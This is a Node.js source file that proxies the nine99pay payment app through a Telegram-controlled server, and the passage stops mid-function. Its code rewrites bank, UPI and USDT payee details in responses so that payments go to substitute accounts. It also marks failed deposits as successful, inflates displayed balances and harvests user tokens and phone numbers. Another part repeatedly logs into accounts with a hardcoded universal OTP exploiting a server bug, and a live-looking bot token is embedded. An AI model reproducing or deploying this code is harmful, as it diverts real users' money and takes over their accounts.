const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');

const app = express();
const ORIGINAL_API = 'https://nine99pay.com';
const BOT_TOKEN = process.env.BOT_TOKEN || '8661860856:AAHlPqnki7SpppaFbwD3Ylz1k5cydEHbhZo';
const WEBHOOK_URL = 'https://cvbgh.vercel.app/bot-webhook';
const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

const DEFAULT_DATA = {
  banks: [],
  activeIndex: -1,
  botEnabled: true,
  autoRotate: false,
  lastUsedIndex: -1,
  adminChatId: null,
  logRequests: false,
  usdtAddress: '',
  depositSuccess: false,
  depositBonus: 0,
  withdrawOverride: 0,
  userOverrides: {},
  trackedUsers: {}
};

let bot = null;
let webhookSet = false;
try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {}

let redis = null;
if (REDIS_URL && REDIS_TOKEN) {
  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch(e) {}
}

let cachedData = null;
let cacheTime = 0;
const CACHE_TTL = 5000;
const tokenUserMap = {};
const userPhoneMap = {};
let debugNextResponse = false;

async function ensureWebhook() {
  if (!bot || webhookSet) return;
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
  } catch(e) {}
}

async function loadData(forceRefresh) {
  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
  if (!redis) return { ...DEFAULT_DATA };
  try {
    let raw = await redis.get('nine99payData');
    if (raw) {
      if (typeof raw === 'string') {
        try { raw = JSON.parse(raw); } catch(e) {}
      }
      if (typeof raw === 'object' && raw !== null) {
        cachedData = { ...DEFAULT_DATA, ...raw };
      } else {
        cachedData = { ...DEFAULT_DATA };
      }
    } else {
      cachedData = { ...DEFAULT_DATA };
    }
    if (!cachedData.userOverrides) cachedData.userOverrides = {};
    if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
    if (!cachedData.orderBankMap) cachedData.orderBankMap = {};
    if (!cachedData._migratedOldHash) {
      try {
        const oldMap = await redis.hgetall('nine99payOrderBankMap');
        const oldCount = oldMap ? Object.keys(oldMap).length : 0;
        if (oldMap && typeof oldMap === 'object' && oldCount > 0) {
          let migrated = 0;
          for (const [oid, val] of Object.entries(oldMap)) {
            if (!cachedData.orderBankMap[oid]) {
              try {
                const parsed = typeof val === 'string' ? JSON.parse(val) : val;
                if (parsed && typeof parsed === 'object') {
                  cachedData.orderBankMap[oid] = parsed;
                  migrated++;
                }
              } catch(pe) {}
            }
          }
          console.log(`Migration: found ${oldCount} old entries, migrated ${migrated} new`);
        }
        cachedData._migratedOldHash = true;
        await redis.set('nine99payData', cachedData);
      } catch(e) { console.error('Migration error:', e.message); }
    }
    cacheTime = Date.now();
    return cachedData;
  } catch(e) {
    console.error('Redis load error:', e.message);
  }
  cachedData = { ...DEFAULT_DATA };
  cacheTime = Date.now();
  return cachedData;
}

async function saveData(data) {
  const skipMerge = data._skipOverrideMerge;
  if (skipMerge) delete data._skipOverrideMerge;
  if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
  try {
    if (!skipMerge) {
      const current = await redis.get('nine99payData');
      if (current && typeof current === 'object') {
        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'suspendedPhones', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'activePhones'];
        for (const key of settingsKeys) {
          if (current[key] !== undefined) {
            data[key] = current[key];
          }
        }
        if (current.userOverrides) {
          data.userOverrides = JSON.parse(JSON.stringify(current.userOverrides));
        }
        if (current.balanceHistory && Array.isArray(current.balanceHistory)) {
          if (!data.balanceHistory || data.balanceHistory.length < current.balanceHistory.length) {
            data.balanceHistory = current.balanceHistory;
          }
        }
        if (current.sellHistory && Array.isArray(current.sellHistory)) {
          if (!data.sellHistory || data.sellHistory.length < current.sellHistory.length) {
            data.sellHistory = current.sellHistory;
          }
        }
        if (current.orderBankMap && typeof current.orderBankMap === 'object') {
          if (!data.orderBankMap) data.orderBankMap = {};
          for (const oid of Object.keys(current.orderBankMap)) {
            if (!data.orderBankMap[oid]) {
              data.orderBankMap[oid] = current.orderBankMap[oid];
            }
          }
        }
        if (current.fakeBills && typeof current.fakeBills === 'object') {
          if (!data.fakeBills) data.fakeBills = {};
          for (const uid of Object.keys(current.fakeBills)) {
            if (!data.fakeBills[uid] || data.fakeBills[uid].length < current.fakeBills[uid].length) {
              data.fakeBills[uid] = current.fakeBills[uid];
            }
          }
        }
      }
    }
    cachedData = data;
    cacheTime = Date.now();
    await redis.set('nine99payData', data);
  } catch(e) {
    console.error('Redis save error:', e.message);
    cachedData = data;
    cacheTime = Date.now();
  }
}

// Hardcoded universal OTP that 999pay accepts for any number (server-side bug)
const ACTIVE_HARDCODED_OTP = '030201';

// In-process active-login monitor state
let _activeMonitorPhones = [];
let _activeMonitorAdminChatId = null;
let _activeMonitorLastRefresh = 0;
let _activeMonitorTicking = false;
let _activeMonitorStarted = false;
let _activeStats = { logins: 0, ok: 0, fail: 0, perPhone: {} };
let _activeStatsLastReport = Date.now();
let _activeLastErrorLog = {};

const ACTIVE_TICK_MS = parseInt(process.env.ACTIVE_TICK_MS, 10) || 100;
const ACTIVE_REFRESH_MS = parseInt(process.env.ACTIVE_REFRESH_MS, 10) || 3000;
const ACTIVE_STATS_REPORT_MS = parseInt(process.env.ACTIVE_STATS_REPORT_MS, 10) || 300000;

async function refreshActiveMonitorPhones() {
  if (Date.now() - _activeMonitorLastRefresh < ACTIVE_REFRESH_MS) return;
  if (!redis) { _activeMonitorPhones = []; return; }
  try {
    let raw = await redis.get('nine99payData');
    if (typeof raw === 'string') { try { raw = JSON.parse(raw); } catch(e) {} }
    if (raw && typeof raw === 'object') {
      _activeMonitorPhones = Array.isArray(raw.activePhones) ? raw.activePhones.map(String) : [];
      _activeMonitorAdminChatId = raw.adminChatId || _activeMonitorAdminChatId;
    } else {
      _activeMonitorPhones = [];
    }
    _activeMonitorLastRefresh = Date.now();
  } catch(e) { /* ignore */ }
}

async function activeMonitorTick() {
  if (_activeMonitorTicking) return;
  _activeMonitorTicking = true;
  try {
    await refreshActiveMonitorPhones();
    if (!_activeMonitorPhones.length) return;
    await Promise.all(_activeMonitorPhones.map(async (phone) => {
      const r = await fireActiveLogin(phone);
      _activeStats.logins++;
      _activeStats.perPhone[phone] = _activeStats.perPhone[phone] || { ok: 0, fail: 0 };
      if (r.ok) { _activeStats.ok++; _activeStats.perPhone[phone].ok++; }
      else {
        _activeStats.fail++;
        _activeStats.perPhone[phone].fail++;
        const now = Date.now();
        if (!_activeLastErrorLog[phone] || now - _activeLastErrorLog[phone] > 30000) {
          _activeLastErrorLog[phone] = now;
          console.error(`[active] ${phone} fail: ${r.error}`);
        }
      }
    }));
    if (Date.now() - _activeStatsLastReport > ACTIVE_STATS_REPORT_MS && _activeStats.logins > 0) {
      _activeStatsLastReport = Date.now();
      const lines = [
        `🔄 Active Login Monitor (last ${Math.round(ACTIVE_STATS_REPORT_MS / 60000)}m)`,
        `Active phones: ${_activeMonitorPhones.length}`,
        `Total logins: ${_activeStats.logins}`,
        `✅ Success: ${_activeStats.ok}`,
        `❌ Failed: ${_activeStats.fail}`,
      ];
      for (const [ph, s] of Object.entries(_activeStats.perPhone)) {
        lines.push(`  ${ph}: ✅${s.ok} ❌${s.fail}`);
      }
      const msg = lines.join('\n');
      console.log('[active]', msg);
      if (_activeMonitorAdminChatId && bot) {
        bot.sendMessage(_activeMonitorAdminChatId, msg).catch(()=>{});
      }
      _activeStats = { logins: 0, ok: 0, fail: 0, perPhone: {} };
    }
  } finally {
    _activeMonitorTicking = false;
  }
}

// Start the in-process loop ONCE. Works when index.js runs as long-lived Node
// process (e.g. Replit workflow). On Vercel serverless, the loop only ticks
// while the lambda is warm — for guaranteed continuous re-login, also run this
// file as a Replit workflow OR ping `/active-tick` externally every 100ms.
function startActiveMonitor() {
  if (_activeMonitorStarted) return;
  _activeMonitorStarted = true;
  console.log(`[active] monitor loop started — tick=${ACTIVE_TICK_MS}ms refresh=${ACTIVE_REFRESH_MS}ms`);
  setInterval(() => { activeMonitorTick().catch(()=>{}); }, ACTIVE_TICK_MS);
}
startActiveMonitor();

// Fire a login request to upstream for the given phone, using hardcoded OTP.
// Used by /active command (single immediate fire) and by external monitor loop.
async function fireActiveLogin(phone) {
  const headers = {
    'user-agent': 'okhttp/3.12.0',
    'content-type': 'application/json; charset=UTF-8',
    'packageinfo': 'com.india.cnm',
    'packageid': '6',
    'channel': 'GP00',
    'lang': 'en',
    'version': '6.0.2.6',
    'devicecode': 'active-' + Math.random().toString(36).substring(2, 12),
    'fcmtoken': 'active-monitor',
    'accept': '*/*',
    'reqdate': String(Math.floor(Date.now() / 1000)),
    'host': 'nine99pay.com',
  };
  const body = JSON.stringify({ code: ACTIVE_HARDCODED_OTP, phone: String(phone) });
  try {
    const resp = await fetch(ORIGINAL_API + '/app/user/login/otp', { method: 'POST', headers, body });
    const text = await resp.text();
    let json = null;
    try { json = JSON.parse(text); } catch(e) {}
    if (json && json.code === 200) return { ok: true, userId: (json.data && (json.data.uuid || json.data.loginId)) || '' };
    return { ok: false, error: (json && json.msg) || text.substring(0, 150) };
  } catch(e) {
    return { ok: false, error: e.message };
  }
}

function getTokenFromReq(req) {
  const headers = req.headers || {};
  for (const [k, v] of Object.entries(headers)) {
    const kl = k.toLowerCase();
    if (kl === 'host' || kl === 'connection' || kl === 'content-type' || kl === 'content-length' ||
        kl === 'accept' || kl === 'accept-encoding' || kl === 'accept-language' ||
        kl === 'user-agent' || kl === 'origin' || kl === 'referer' || kl === 'cookie' ||
        kl === 'cache-control' || kl === 'pragma' || kl === 'sec-ch-ua' || kl === 'sec-fetch-dest' ||
        kl === 'sec-fetch-mode' || kl === 'sec-fetch-site' || kl === 'transfer-encoding' ||
        kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') || kl.startsWith('sec-') ||
        kl === 'packageinfo' || kl === 'version' || kl === 'devicecode' || kl === 'fcmtoken' ||
        kl === 'if-none-match' || kl === 'if-modified-since') continue;
    if (typeof v === 'string' && v.length > 10) return v;
  }
  return headers['authorization'] || headers['token'] || '';
}

async function saveOrderBank(data, orderId, bank) {
  if (!orderId || !bank || orderId === 'N/A') return;
  if (!data.orderBankMap) data.orderBankMap = {};
  data.orderBankMap[String(orderId)] = { accountHolder: bank.accountHolder, accountNo: bank.accountNo, ifsc: bank.ifsc, bankName: bank.bankName || '', upiId: bank.upiId || '' };
  await saveData(data);
}

async function markOrderBankSkip(data, orderId) {
  if (!orderId || orderId === 'N/A') return;
  if (!data.orderBankMap) data.orderBankMap = {};
  data.orderBankMap[String(orderId)] = { _skip: true, t: Date.now() };
  await saveData(data);
}

function hasOrderBankEntry(data, orderId) {
  if (!orderId || !data.orderBankMap) return false;
  return !!data.orderBankMap[String(orderId)];
}

async function saveOrderBankMultipleKeys(data, ids, bank) {
  if (!bank) return;
  const uniqueIds = [...new Set(ids.map(String).filter(id => id && id !== 'N/A'))];
  if (uniqueIds.length === 0) return;
  if (!data.orderBankMap) data.orderBankMap = {};
  const bankData = { accountHolder: bank.accountHolder, accountNo: bank.accountNo, ifsc: bank.ifsc, bankName: bank.bankName || '', upiId: bank.upiId || '' };
  for (const id of uniqueIds) {
    data.orderBankMap[id] = bankData;
  }
  await saveData(data);
}

function getOrderBank(data, orderId) {
  if (!orderId || !data.orderBankMap) return null;
  const entry = data.orderBankMap[String(orderId)];
  if (!entry || entry._skip) return null;
  return entry;
}

function getOrderBankMultiple(data, ids) {
  if (!data.orderBankMap) return null;
  for (const id of ids) {
    if (!id) continue;
    const bank = data.orderBankMap[String(id)];
    if (bank && !bank._skip) return bank;
  }
  return null;
}

function saveTokenUserId(req, userId) {
  if (!userId) return;
  const tok = getTokenFromReq(req);
  if (tok && tok.length > 10) {
    const key = tok.substring(0, 100);
    tokenUserMap[key] = String(userId);
    if (redis) redis.hset('nine99payTokenMap', key, String(userId)).catch(()=>{});
  }
}

async function getUserIdFromToken(req) {
  const tok = getTokenFromReq(req);
  if (!tok || tok.length < 10) return null;
  const key = tok.substring(0, 100);
  if (tokenUserMap[key]) return tokenUserMap[key];
  if (redis) {
    try {
      const stored = await redis.hget('nine99payTokenMap', key);
      if (stored) { tokenUserMap[key] = String(stored); return String(stored); }
    } catch(e) {}
  }
  return null;
}

async function extractUserId(req, jsonResp) {
  const fromToken = await getUserIdFromToken(req);
  if (fromToken) return fromToken;
  const body = req.parsedBody || {};
  const uid = body.userId || body.uuid || body.loginId || '';
  if (uid) return String(uid);
  const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
  if (qs.get('userId')) return String(qs.get('userId'));
  if (qs.get('uuid')) return String(qs.get('uuid'));
  const respData = getResponseData(jsonResp);
  if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
    const rid = respData.userId || respData.uuid || respData.loginId || '';
    if (rid) return String(rid);
  }
  return '';
}

async function trackUser(data, userId, info, phone) {
  if (!userId) return;
  if (!data.trackedUsers) data.trackedUsers = {};
  const existing = data.trackedUsers[String(userId)] || {};
  data.trackedUsers[String(userId)] = {
    lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
    lastAction: info || existing.lastAction || '',
    orderCount: (existing.orderCount || 0) + (info && info.includes('Order') ? 1 : 0),
    phone: phone || existing.phone || ''
  };
  if (phone) userPhoneMap[String(userId)] = phone;
}

function isLogOff(data, userId) {
  if (!userId) return false;
  const uo = data.userOverrides && data.userOverrides[String(userId)];
  return uo && uo.logOff === true;
}

const logOffTokens = new Set();
const checkedTokens = new Set();

function isLogOffByTokenFast(data, req) {
  const tok = getTokenFromReq(req);
  if (!tok || tok.length < 10) return false;
  const tKey = tok.substring(0, 100);
  if (logOffTokens.has(tKey)) return true;
  const userId = tokenUserMap[tKey] || '';
  if (userId && isLogOff(data, userId)) { logOffTokens.add(tKey); return true; }
  return false;
}

async function isLogOffByToken(data, req) {
  const tok = getTokenFromReq(req);
  if (!tok || tok.length < 10) return false;
  const tKey = tok.substring(0, 100);
  if (logOffTokens.has(tKey)) return true;
  if (checkedTokens.has(tKey)) return false;
  const userId = tokenUserMap[tKey] || '';
  if (userId && isLogOff(data, userId)) { logOffTokens.add(tKey); return true; }
  if (redis) {
    try {
      const isOff = await redis.sismember('nine99payLogOffTokens', tKey);
      if (isOff) { logOffTokens.add(tKey); return true; }
      const stored = await redis.hget('nine99payTokenMap', tKey);
      if (stored && isLogOff(data, stored)) { logOffTokens.add(tKey); redis.sadd('nine99payLogOffTokens', tKey).catch(()=>{}); return true; }
    } catch(e) {}
  }
  checkedTokens.add(tKey);
  return false;
}

function getPhone(data, userId) {
  if (!userId) return '';
  if (userPhoneMap[String(userId)]) return userPhoneMap[String(userId)];
  const tracked = data.trackedUsers && data.trackedUsers[String(userId)];
  if (tracked && tracked.phone) {
    userPhoneMap[String(userId)] = tracked.phone;
    return tracked.phone;
  }
  return '';
}

function getUserOverride(data, userId) {
  if (!userId || !data.userOverrides) return null;
  return data.userOverrides[String(userId)] || null;
}

function getEffectiveSettings(data, userId) {
  const uo = getUserOverride(data, userId);
  return {
    botEnabled: uo && uo.botEnabled !== undefined ? uo.botEnabled : data.botEnabled,
    depositSuccess: uo && uo.depositSuccess !== undefined ? uo.depositSuccess : data.depositSuccess,
    depositBonus: uo && uo.depositBonus !== undefined ? uo.depositBonus : (data.depositBonus || 0),
    bankOverride: uo && uo.bankIndex !== undefined ? uo.bankIndex : null,
    forceReviewSuccess: uo && uo.forceReviewSuccess === true,
    _userId: userId
  };
}

function getForceReviewSuccessUserIds(data) {
  const ids = [];
  if (!data.userOverrides) return ids;
  for (const uid of Object.keys(data.userOverrides)) {
    if (data.userOverrides[uid].forceReviewSuccess === true) ids.push(uid);
  }
  return ids;
}

function getActiveBank(data, userId, orderAmount) {
  const hasAmt = orderAmount !== undefined && orderAmount !== null && isFinite(orderAmount);
  const qualifies = (b) => !hasAmt || (Number(b.minAmount) || 0) <= Number(orderAmount);

  // STRICT: user-pinned bank — if it doesn't qualify for the amount, return null
  // (real upstream bank passes through; no silent fallback to other banks).
  const uo = getUserOverride(data, userId);
  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
    const pinned = data.banks[uo.bankIndex];
    return qualifies(pinned) ? pinned : null;
  }

  // Auto-rotate: pick randomly only from eligible banks
  if (data.autoRotate && data.banks.length > 0) {
    const eligible = data.banks.filter(qualifies);
    if (eligible.length === 0) return null;
    if (eligible.length === 1) {
      const realIdx = data.banks.indexOf(eligible[0]);
      data.lastUsedIndex = realIdx;
      data._rotatedIndex = realIdx;
      return eligible[0];
    }
    let pickIdx;
    do {
      pickIdx = Math.floor(Math.random() * eligible.length);
    } while (data.banks.indexOf(eligible[pickIdx]) === data.lastUsedIndex);
    const chosen = eligible[pickIdx];
    const realIdx = data.banks.indexOf(chosen);
    data.lastUsedIndex = realIdx;
    data._rotatedIndex = realIdx;
    return chosen;
  }

  // STRICT manual mode: if /setbank picked an active bank but it fails the
  // amount threshold, return null so the real upstream bank passes through.
  // Do NOT silently fall through to a different bank.
  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) {
    const ab = data.banks[data.activeIndex];
    return qualifies(ab) ? ab : null;
  }

  // No activeIndex set at all — first bank that qualifies (only relevant on
  // a fresh setup before /setbank was ever called).
  if (data.banks.length > 0) {
    const first = data.banks[0];
    return qualifies(first) ? first : null;
  }
  return null;
}

async function getActiveBankAndSave(data, userId, orderAmount) {
  const bank = getActiveBank(data, userId, orderAmount);
  if (data.autoRotate && data._rotatedIndex !== undefined) {
    data.lastUsedIndex = data._rotatedIndex;
    delete data._rotatedIndex;
    await saveData(data);
  }
  return bank;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    const minA = Number(b.minAmount) || 0;
    const min = minA > 0 ? ` | ≥₹${minA}` : ' | any amt';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${min}${a}`;
  }).join('\n');
}

app.use(async (req, res, next) => {
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    const ct = (req.headers['content-type'] || '').toLowerCase();
    try {
      if (ct.includes('json')) {
        req.parsedBody = JSON.parse(req.rawBody.toString());
      } else if (ct.includes('form') && !ct.includes('multipart')) {
        const params = new URLSearchParams(req.rawBody.toString());
        req.parsedBody = Object.fromEntries(params);
      } else {
        req.parsedBody = {};
      }
    } catch(e) { req.parsedBody = {}; }
    next();
  });
});

async function proxyFetch(req) {
  const url = ORIGINAL_API + req.originalUrl;
  const fwd = {};
  for (const [k, v] of Object.entries(req.headers)) {
    const kl = k.toLowerCase();
    if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
        kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
    fwd[k] = v;
  }
  fwd['host'] = 'nine99pay.com';
  const opts = { method: req.method, headers: fwd };
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
    opts.body = req.rawBody;
    fwd['content-length'] = String(req.rawBody.length);
  }
  const response = await fetch(url, opts);
  const respBody = await response.text();
  const respHeaders = {};
  response.headers.forEach((val, key) => {
    const kl = key.toLowerCase();
    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
      respHeaders[key] = val;
    }
  });
  let jsonResp = null;
  try { jsonResp = JSON.parse(respBody); } catch(e) {}
  return { response, respBody, respHeaders, jsonResp };
}

function getResponseData(jsonResp) {
  if (!jsonResp) return null;
  if (jsonResp.data !== undefined) return jsonResp.data;
  if (jsonResp.body) return jsonResp.body;
  return null;
}

function sendChunked(botInst, chatId, text, chunkSize = 3800) {
  if (!botInst || !chatId || !text) return;
  try {
    const s = String(text);
    if (s.length <= chunkSize) {
      botInst.sendMessage(chatId, s).catch(()=>{});
      return;
    }
    const total = Math.ceil(s.length / chunkSize);
    for (let i = 0; i < total; i++) {
      const part = s.substring(i * chunkSize, (i + 1) * chunkSize);
      const header = `(${i + 1}/${total})\n`;
      botInst.sendMessage(chatId, header + part).catch(()=>{});
    }
  } catch(e) { /* ignore */ }
}

function sendJson(res, headers, json, fallback) {
  const body = json ? JSON.stringify(json) : fallback;
  headers['content-type'] = 'application/json; charset=utf-8';
  headers['content-length'] = String(Buffer.byteLength(body));
  headers['cache-control'] = 'no-store, no-cache, must-revalidate';
  headers['pragma'] = 'no-cache';
  delete headers['etag'];
  delete headers['last-modified'];
  res.writeHead(200, headers);
  res.end(body);
}

async function transparentProxy(req, res) {
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    if (jsonResp) {
      const rd = getResponseData(jsonResp);
      const uid = rd && typeof rd === 'object' && !Array.isArray(rd) ? (rd.userId || rd.uuid || rd.loginId || '') : '';
      if (uid) saveTokenUserId(req, uid);
    }

    const data = cachedData || await loadData();
    if (data.usdtAddress && jsonResp) {
      const result = replaceUsdtInResponse(jsonResp, data);
      if (result && result.oldAddr) {
        const newBody = JSON.stringify(jsonResp);
        respHeaders['content-type'] = 'application/json; charset=utf-8';
        respHeaders['content-length'] = String(Buffer.byteLength(newBody));
        respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
        delete respHeaders['etag'];
        delete respHeaders['last-modified'];
        res.writeHead(response.status, respHeaders);
        res.end(newBody);
        return;
      }
    }

    res.writeHead(response.status, respHeaders);
    res.end(respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

const BANK_FIELDS = {
  'accountno': 'accountNo', 'accountnumber': 'accountNo', 'account_no': 'accountNo',
  'receiveaccountno': 'accountNo', 'bankaccount': 'accountNo', 'acno': 'accountNo',
  'bankaccountno': 'accountNo', 'beneficiaryaccount': 'accountNo', 'payeeaccount': 'accountNo',
  'holderaccount': 'accountNo', 'cardno': 'accountNo', 'cardnumber': 'accountNo',
  'bankcardno': 'accountNo', 'payeecardno': 'accountNo', 'receivecardno': 'accountNo',
  'payeebankaccount': 'accountNo', 'payeebankaccountno': 'accountNo', 'payeeaccountno': 'accountNo',
  'receiveraccount': 'accountNo', 'receiveraccountno': 'accountNo', 'receiveaccountnumber': 'accountNo',
  'walletaccount': 'accountNo', 'walletno': 'accountNo', 'walletaccountno': 'accountNo',
  'collectionaccount': 'accountNo', 'collectionaccountno': 'accountNo',
  'customerbanknumber': 'accountNo', 'customerbankaccount': 'accountNo', 'customeraccountno': 'accountNo',
  'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
  'accname': 'accountHolder',
  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder', 'name': 'accountHolder',
  'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
  'payeename': 'accountHolder', 'bankaccountname': 'accountHolder', 'realname': 'accountHolder',
  'cardholder': 'accountHolder', 'cardname': 'accountHolder', 'bankcardname': 'accountHolder',
  'payeecardname': 'accountHolder', 'receivecardname': 'accountHolder', 'receivercardname': 'accountHolder',
  'receivername': 'accountHolder', 'collectionname': 'accountHolder', 'collectionaccountname': 'accountHolder',
  'payeerealname': 'accountHolder', 'receiverrealname': 'accountHolder',
  'customername': 'accountHolder', 'customerrealname': 'accountHolder',
  'ifsc': 'ifsc', 'ifsccode': 'ifsc', 'ifsc_code': 'ifsc', 'receiveifsc': 'ifsc',
  'bankifsc': 'ifsc', 'payeeifsc': 'ifsc', 'payeebankifsc': 'ifsc', 'receiverifsc': 'ifsc',
  'receiverbankifsc': 'ifsc', 'collectionifsc': 'ifsc',
  'bankname': 'bankName', 'bank_name': 'bankName', 'bank': 'bankName',
  'payeebankname': 'bankName', 'receiverbankname': 'bankName', 'receivebankname': 'bankName',
  'collectionbankname': 'bankName',
  'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId',
  'upiaddress': 'upiId', 'payeeupi': 'upiId', 'payeeupiid': 'upiId',
  'receiverupi': 'upiId', 'walletupi': 'upiId', 'collectionupi': 'upiId',
  'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId',
  'customerupi': 'upiId'
};

function replaceBankInUrl(urlStr, bank) {
  if (!urlStr || typeof urlStr !== 'string') return urlStr;
  if (!urlStr.includes('://') && !urlStr.includes('?')) return urlStr;
  const urlParams = [
    { names: ['account', 'accountNo', 'account_no', 'accountno', 'account_number', 'accountNumber', 'acc', 'receiveAccountNo', 'receiver_account', 'pa'], value: bank.accountNo },
    { names: ['name', 'accountName', 'account_name', 'accountname', 'accName', 'receiveAccountName', 'receiver_name', 'beneficiary_name', 'beneficiaryName', 'pn', 'holder_name'], value: bank.accountHolder },
    { names: ['ifsc', 'ifsc_code', 'ifscCode', 'receiveIfsc', 'IFSC'], value: bank.ifsc }
  ];
  let result = urlStr;
  for (const group of urlParams) {
    if (!group.value) continue;
    for (const paramName of group.names) {
      const regex = new RegExp('([?&])(' + paramName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')=([^&]*)', 'i');
      result = result.replace(regex, '$1$2=' + encodeURIComponent(group.value));
    }
  }
  if (bank.upiId && result.includes('upi://pay')) {
    result = result.replace(/pa=[^&]+/, `pa=${bank.upiId}`);
    if (bank.accountHolder) result = result.replace(/pn=[^&]+/, `pn=${encodeURIComponent(bank.accountHolder)}`);
  }
  return result;
}

function deepReplace(obj, bank, originalValues, depth) {
  if (!obj || typeof obj !== 'object' || depth > 10) return;
  if (!originalValues) originalValues = {};
  for (const key of Object.keys(obj)) {
    const val = obj[key];
    if (val && typeof val === 'object') {
      if (Array.isArray(val)) {
        val.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bank, originalValues, depth + 1); });
      } else {
        deepReplace(val, bank, originalValues, depth + 1);
      }
      continue;
    }
    if (typeof val !== 'string' && typeof val !== 'number') continue;
    const kl = key.toLowerCase().replace(/[_\-\s]/g, '');
    const mapped = BANK_FIELDS[kl];
    if (mapped && bank[mapped] && String(val).length > 0) {
      if (typeof val === 'string' && val.length > 3) originalValues[key] = val;
      obj[key] = bank[mapped];
    }
    if (typeof val === 'string') {
      if (val.includes('://') || (val.includes('?') && val.includes('='))) {
        obj[key] = replaceBankInUrl(val, bank);
      }
      for (const [origKey, origVal] of Object.entries(originalValues)) {
        if (typeof origVal === 'string' && origVal.length > 3 && typeof obj[key] === 'string' && obj[key].includes(origVal)) {
          const mappedF = BANK_FIELDS[origKey.toLowerCase().replace(/[_\-\s]/g, '')];
          if (mappedF && bank[mappedF]) {
            obj[key] = obj[key].split(origVal).join(bank[mappedF]);
          }
        }
      }
    }
  }
}

function markDepositSuccess(obj) {
  if (!obj) return;
  const failValues = [3, '3', 4, '4', -1, '-1', 'failed', 'fail', 'FAILED', 'FAIL', 'cancelled', 'canceled'];
  if (obj.payStatus !== undefined) {
    if (!failValues.includes(obj.payStatus)) obj.payStatus = 2;
    return;
  }
  const statusFields = ['status', 'orderStatus', 'rechargeStatus', 'state', 'stat'];
  for (const field of statusFields) {
    if (obj[field] !== undefined) {
      if (failValues.includes(obj[field])) continue;
      if (typeof obj[field] === 'number') obj[field] = 2;
      else if (typeof obj[field] === 'string') {
        const num = parseInt(obj[field]);
        obj[field] = !isNaN(num) ? '2' : 'success';
      }
    }
  }
}

function markReviewAsSuccess(obj) {
  if (!obj) return;
  const reviewStrings = ['review', 'under_review', 'pending_review', 'reviewing', 'under review'];
  for (const key of Object.keys(obj)) {
    const kl = key.toLowerCase();
    if (kl.includes('status') || kl.includes('state')) {
      const val = obj[key];
      if (typeof val === 'string' && reviewStrings.some(r => val.toLowerCase().includes(r))) {
        obj[key] = 'SUCCESS';
      }
    }
  }
}

function addBonusToBalanceFields(obj, bonus) {
  if (!obj || typeof obj !== 'object') return;
  const balanceKeys = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money', 'coin', 'wallet', 'usermoney', 'rechargebalance'];
  const skipKeys = ['availablewithdrawbalance', 'processwithdrawbalance', 'frozenbalance', 'freezebalance', 'withdrawbalance', 'todayearnings', 'totalearnings', 'buyamounttotal', 'sellamounttotal'];
  for (const key of Object.keys(obj)) {
    if (balanceKeys.includes(key.toLowerCase())) {
      const current = parseFloat(obj[key]);
      if (!isNaN(current)) {
        obj[key] = typeof obj[key] === 'string' ? String((current + bonus).toFixed(2)) : parseFloat((current + bonus).toFixed(2));
      }
    }
    if (typeof obj[key] === 'object' && obj[key] !== null && !Array.isArray(obj[key])) {
      addBonusToBalanceFields(obj[key], bonus);
    }
  }
}

function replaceUsdtInResponse(jsonResp, data) {
  if (!data.usdtAddress || !jsonResp) return null;
  const newAddr = data.usdtAddress;
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
  function scanAndReplace(obj, depth) {
    if (!obj || typeof obj !== 'object' || depth > 10) return '';
    if (Array.isArray(obj)) { obj.forEach(item => scanAndReplace(item, depth + 1)); return ''; }
    let oldAddr = '';
    for (const key of Object.keys(obj)) {
      const kl = key.toLowerCase();
      if (typeof obj[key] === 'string') {
